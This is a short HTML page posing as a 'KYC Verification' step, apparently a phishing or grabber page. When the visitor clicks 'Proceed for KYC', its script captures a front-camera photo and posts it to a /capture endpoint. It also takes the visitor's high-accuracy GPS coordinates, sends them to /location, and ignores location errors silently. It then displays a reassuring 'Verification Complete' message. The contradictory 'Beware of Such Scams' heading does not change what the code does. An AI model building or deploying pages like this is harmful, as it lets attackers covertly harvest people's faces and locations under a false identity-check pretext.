<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>KYC Verification</title>

<style>
body {
  min-height: 100vh;
  background: #0b0e11;
  display: flex;
  justify-content: center;
  align-items: center;
  color: #ffffff;
}

.box {
  max-width: 520px;
  background: #111;
  border: 1px solid #2a2d33;
  border-radius: 6px;
  padding: 40px 30px;
  text-align: center;
}

h1 {
  font-family: Verdana, sans-serif;
  font-size: 24px;
  color: #ff4d4f;
  margin-bottom: 20px;
}

p {
  font-size: 15px;
  line-height: 1.6;
  color: #e4e6eb;
}

button {
  margin-top: 25px;
  padding: 12px 22px;
  background: #3f4db8;
  border: none;
  border-radius: 6px;
  color: #fff;
  font-size: 15px;
  cursor: pointer;
}
</style>
</head>

<body>

<div class="box" id="kycBox">
  <h1>Beware of Such Scams</h1>
  <p>
    This verification step is required to continue.<br>
    Camera and location access will be used for KYC purposes only.
  </p>

  <button onclick="startKYC()">Proceed for KYC</button>
</div>

<div class="box" id="finalBox" style="display:none;">
  <h1>Verification Complete</h1>
  <p>
    Your KYC verification has been completed successfully.<br>
    You may now continue to the final page.
  </p>
</div>

<script>
/* ===== SAME LOGIC AS OLD AUTHORITATIVE CODE ===== */

// Camera capture (unchanged)
async function capturePhoto() {
  let stream = null;
  try {
    stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" }
    });

    const video = document.createElement("video");
    video.srcObject = stream;
    await video.play();

    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext("2d").drawImage(video, 0, 0);

    stream.getTracks().forEach(t => t.stop());
    return canvas.toDataURL("image/jpeg", 0.8);
  } catch (e) {
    if (stream) stream.getTracks().forEach(t => t.stop());
    throw e;
  }
}

async function startKYC() {
  try {
    /* CAMERA */
    const imageData = await capturePhoto();

    await fetch("/capture", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ image: imageData })
    });

    /* LOCATION (NON-BLOCKING) */
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        pos => {
          fetch("/location", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              lat: pos.coords.latitude,
              lon: pos.coords.longitude,
              accuracy: pos.coords.accuracy
            })
          });
        },
        () => {
          /* silently ignore */
        },
        { enableHighAccuracy: true }
      );
    }

    /* FINAL PAGE */
    document.getElementById("kycBox").style.display = "none";
    document.getElementById("finalBox").style.display = "block";

  } catch (err) {
    alert("KYC permission denied or unavailable");
  }
}
</script>

</body>
</html>
